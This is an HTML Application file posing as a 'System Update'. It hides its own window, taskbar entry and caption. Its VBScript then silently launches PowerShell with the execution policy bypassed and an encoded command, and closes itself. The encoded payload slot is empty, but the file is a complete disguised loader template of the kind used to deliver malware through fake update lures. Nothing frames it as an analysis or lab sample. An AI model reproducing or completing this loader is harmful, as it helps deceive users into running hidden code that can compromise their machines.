<html>
<head>
    <title>System Update</title>
    <HTA:APPLICATION 
        ID="oHTA"
        APPLICATIONNAME="AppExec"
        BORDER="none"
        BORDERSTYLE="none"
        CAPTION="no"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no"
        WINDOWSTATE="minimize">
</head>
<body>
    <script language="VBScript">
        Option Explicit
        
        Dim ShellApp
        Set ShellApp = CreateObject("Shell.Application")
        ShellApp.ShellExecute "powershell.exe", "-NoProfile -ExecutionPolicy Bypass -EncodedCommand " & "", "", "", 0
        Self.Close
    </script>
</body>
</html>